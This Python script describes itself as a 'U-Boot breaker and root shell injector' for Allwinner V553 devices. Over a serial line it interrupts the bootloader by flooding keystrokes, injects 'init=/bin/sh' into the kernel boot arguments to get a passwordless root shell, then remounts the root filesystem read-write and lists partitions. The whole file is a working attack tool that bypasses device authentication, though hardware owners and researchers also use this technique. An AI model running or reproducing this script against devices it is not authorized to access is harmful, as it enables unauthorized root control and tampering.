#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Precision U-Boot Breaker & Root Shell Injector for Allwinner V553
全志 V553 精准时延 U-Boot 拦截与 Root 提权注入器
"""

import sys
import os
import termios
import select
import time

PORT = "/dev/ttyUSB0"
BAUD = 115200

def set_raw(fd):
    attrs = termios.tcgetattr(fd)
    attrs[4] = attrs[5] = termios.B115200
    attrs[0] = 0
    attrs[1] = 0
    attrs[2] = termios.CS8 | termios.CREAD | termios.CLOCAL
    attrs[3] = 0
    termios.tcsetattr(fd, termios.TCSANOW, attrs)
    termios.tcflush(fd, termios.TCIOFLUSH)

def main():
    if not os.path.exists(PORT):
        print(f"[-] Error: {PORT} not found.")
        sys.exit(1)

    fd = os.open(PORT, os.O_RDWR | os.O_NOCTTY | os.O_NONBLOCK)
    set_raw(fd)

    print("=" * 65)
    print(" [*] Precision U-Boot Breaker Ready / 精准时延 U-Boot 拦截器就绪")
    print(" [*] Strategy: Silence in Boot0 (0-1.0s) -> High-speed space in U-Boot")
    print(" [*] >>> PLEASE INSERT THE USB CABLE NOW! <<<")
    print(" [*] >>> 请现在插上 USB 数据线！ <<<")
    print("=" * 65)
    sys.stdout.flush()

    log_f = open("precision_intercept.log", "wb")
    start_time = time.time()
    boot0_seen_time = None
    spamming = False
    interrupted = False
    rx_buf = b""
    chars = [b" ", b"\r"]
    c_idx = 0

    # Wait for up to 60 seconds
    while time.time() - start_time < 60:
        rlist, _, _ = select.select([fd], [], [], 0.005)
        if rlist:
            data = os.read(fd, 2048)
            if data:
                log_f.write(data)
                log_f.flush()
                rx_buf += data
                sys.stdout.buffer.write(data)
                sys.stdout.buffer.flush()

                # Detect BOOT0 startup
                if boot0_seen_time is None and (b"BOOT0" in rx_buf or b"HELLO" in rx_buf):
                    boot0_seen_time = time.time()
                    print("\n[*] Detected BOOT0 starting! Maintaining silence for Boot0...")
                    sys.stdout.flush()

                # Trigger spamming if Jump to second Boot or U-Boot is seen
                if not spamming and (b"Jump to second Boot" in rx_buf or b"U-Boot" in rx_buf or (boot0_seen_time and time.time() - boot0_seen_time >= 0.95)):
                    spamming = True
                    print("\n[!] Triggering HIGH-SPEED Spacebar spamming for U-Boot!")
                    sys.stdout.flush()

                # Check if U-Boot prompt arrived
                if b"=>" in rx_buf[-20:] or b"sunxi#" in rx_buf[-20:] or b"uboot#" in rx_buf[-20:]:
                    interrupted = True
                    break

                # If kernel already started, we missed the U-Boot window
                if b"Starting kernel" in rx_buf or b"Linux version" in rx_buf:
                    print("\n[-] Kernel booted past U-Boot.")
                    break

        # High-frequency spacebar injection during U-Boot phase only
        if spamming and not interrupted:
            try:
                os.write(fd, chars[c_idx % len(chars)])
                c_idx += 1
            except Exception:
                pass

    if interrupted:
        print("\n\n" + "=" * 65)
        print(" [!!!] SUCCESS! U-BOOT INTERRUPTED! / 成功拦截进入 U-Boot！")
        print("=" * 65)
        sys.stdout.flush()

        time.sleep(0.1)
        os.write(fd, b"\r\nprintenv bootargs\r\n")
        time.sleep(0.5)

        # Inject root shell payload
        print("[*] Injecting payload: setenv bootargs \"${bootargs} init=/bin/sh\" && boot")
        os.write(fd, b"setenv bootargs \"${bootargs} init=/bin/sh\"\r\n")
        time.sleep(0.2)
        os.write(fd, b"boot\r\n")
        
        # Read until root shell prompt
        end_t = time.time() + 8.0
        while time.time() < end_t:
            rlist, _, _ = select.select([fd], [], [], 0.1)
            if rlist:
                data = os.read(fd, 2048)
                if data:
                    log_f.write(data)
                    log_f.flush()
                    sys.stdout.buffer.write(data)
                    sys.stdout.buffer.flush()
                    if b"/ #" in data or b"/bin/sh" in data or b"#" in data:
                        print("\n\n" + "=" * 65)
                        print(" [!!!] ROOT SHELL CAPTURED! / 免密 ROOT SHELL 注入成功！")
                        print("=" * 65)
                        os.write(fd, b"\r\nid; mount -o remount,rw /; cat /proc/partitions\r\n")
                        break
    else:
        print(f"\n[-] Intercept ended. Total bytes logged: {len(rx_buf)}")

    log_f.close()
    os.close(fd)

if __name__ == "__main__":
    main()
